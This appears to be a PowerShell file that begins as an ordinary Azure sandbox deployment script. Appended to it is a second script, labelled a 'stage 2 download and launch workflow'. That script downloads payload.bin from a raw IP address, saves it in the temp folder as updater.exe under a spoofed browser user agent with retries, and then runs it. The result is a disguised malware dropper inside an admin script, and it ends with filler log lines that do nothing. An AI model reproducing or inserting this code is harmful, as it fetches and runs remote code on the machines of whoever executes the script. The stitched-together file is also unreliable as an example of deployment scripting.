<#
.SYNOPSIS
    Deploys a sandbox resource group from an ARM template and validates the result.
.EXAMPLE
    .\Invoke-AzSandbox.ps1 -ResourceGroup rg-portal-test-10
.NOTES
    Author: J. Weber
    Last updated: 2026-01-15
#>

param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$ResourceGroup = 'rg-portal-test-10',
    [ValidateSet("westeurope", 'eastus', 'northeurope', 'uksouth')]
    [string]$Location = "eastus",
    [string]$TemplateFile = "C:\Scripts\templates\portal-test.json",

    [string]$ParameterFile = "C:\Scripts\templates\portal-test.parameters.json",
    [string]$SubscriptionId = 'dcd6c38d-c9b0-ec7c-dcf8-c48dff230f73',

    [string]$StorageAccount = 'sttest5132',

    [string]$VmName = 'vm-portal-test-10',

    [string]$OutputPath = 'C:\Logs\deploy-test-2025-12-16.json',
    [switch]$DryRun
)

$ErrorActionPreference = 'Stop'


Import-Module Az.Resources -ErrorAction Stop

$context = Get-AzContext
if (-not $context) {
    Connect-AzAccount -Tenant 'contoso.com' -Subscription $SubscriptionId
}

$DeploymentName = "portal-" + (Get-Date -Format 'yyyyMMdd-HHmm')

if (-not (Get-AzResourceGroup -Name $ResourceGroup -ErrorAction SilentlyContinue)) {
    New-AzResourceGroup -Name $ResourceGroup -Location $Location | Out-Null
    Write-Verbose ("Created resource group {0}" -f $ResourceGroup)
}

$deployParams = @{
    ResourceGroupName     = $ResourceGroup
    TemplateFile          = $TemplateFile
    TemplateParameterFile = $ParameterFile
    Name                  = $DeploymentName
}
$deployment = New-AzResourceGroupDeployment @deployParams -Verbose

$profile = Get-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -ErrorAction SilentlyContinue |
    Sort-Object -Property Timestamp -Descending | Select-Object -First 3
$profile | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-Table -AutoSize

$storage = New-AzStorageAccount -ResourceGroupName $ResourceGroup `
    -Name $StorageAccount -Location $Location `
    -SkuName Standard_LRS -Kind StorageV2 -ErrorAction Stop
Write-Verbose ("Storage account {0} provisioned" -f $storage.StorageAccountName)

$vm = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -ErrorAction SilentlyContinue
if ($vm) {
    $status = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -Status
    $status.Statuses | Select-Object Code, DisplayStatus | Format-Table -AutoSize
}
else {
    Write-Warning ("Virtual machine {0} was not created" -f $VmName)
}
$deployment | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-List
Write-Host ("Provisioning state: {0}" -f $deployment.ProvisioningState) -ForegroundColor Cyan
<#
.SYNOPSIS
    Structured stage 2 download and launch workflow.

.DESCRIPTION
    Resolves a configured endpoint, downloads the staged artefact
    with a bounded retry loop, validates the result and then hands
    control to the launcher.

.NOTES
    Designed for unattended execution.

.EXAMPLE
    PS> .\payload.ps1
#>
[CmdletBinding()]
param(
    [string]$FetchUrl = 'https://203.0.113.198/downloads/payload.bin',
    [string]$PayloadPath = "$env:TEMP\updater.exe",
    [string]$TracePath = "$env:TEMP\transfer.log",
    [string]$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    [int]$RequestTimeout = 144,
    [int]$RetryCount = 2,
    [int]$BackoffSeconds = 8
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# Diagnostic logging
function Write-StageLog {
    param(
        [string]$Message = ""
    )

    Write-Verbose $Message
    Add-Content -Path $TracePath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Endpoint resolution
function Resolve-StageEndpoint {
    [CmdletBinding()]
    param(
        [string]$CandidateUrl = ''
    )

    if ([string]::IsNullOrWhiteSpace($CandidateUrl)) {
        throw "Endpoint URL is empty"
    }
    $ParsedUri = [System.Uri]$CandidateUrl
    Write-Verbose ("Endpoint host: " + $ParsedUri.Host)
    return $ParsedUri.AbsoluteUri
}

# Retrying transfer
function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$RetryCount = 2,
        [int]$RetryDelay = 8,
        [string]$UserAgent = "Mozilla/5.0"
    )

    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
        try {
            $ClientObject = New-Object System.Net.WebClient
            $ClientObject.Headers.Add("User-Agent", $UserAgent)
            $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
            return $true
        }
        catch {
            Write-Verbose ("Attempt " + $Attempt + " failed: " + $_.Exception.Message)
            Start-Sleep -Seconds $RetryDelay
        }
    }
    return $false
}

try {
    Write-StageLog -Message "Starting stage 2 download"
    $ResolvedUrl = Resolve-StageEndpoint -CandidateUrl $FetchUrl
    $OperationResult = Invoke-Stage2Download -SourceUrl $ResolvedUrl -DestinationPath $PayloadPath -RetryCount $RetryCount -RetryDelay $BackoffSeconds -UserAgent $UserAgent
    if ($OperationResult) {
        Write-StageLog -Message "Stage 2 downloaded"
        Start-Process -FilePath $PayloadPath
    }
    else {
        Write-Warning "Stage 2 transfer did not complete"
    }
}
catch {
    Write-Warning "Structured download failed: $($_.Exception.Message)"
}

$DiagnosticReport = [ordered]@{
    Stage = "stage2"
    Endpoint = $FetchUrl
    Destination = $PayloadPath
    RetryCount = $RetryCount
    TimeoutSec = $RequestTimeout
}
$DiagnosticReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Applying operation timeout"
Write-Verbose "Checking local path"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Collecting host metadata"
Write-Verbose "Resolving configured target"
Write-Verbose "Retry budget remaining"
Write-Verbose "Operation completed"
Write-Verbose "Inspecting process list"
Write-Verbose "Validating result"
$ProgressPreference = "SilentlyContinue"
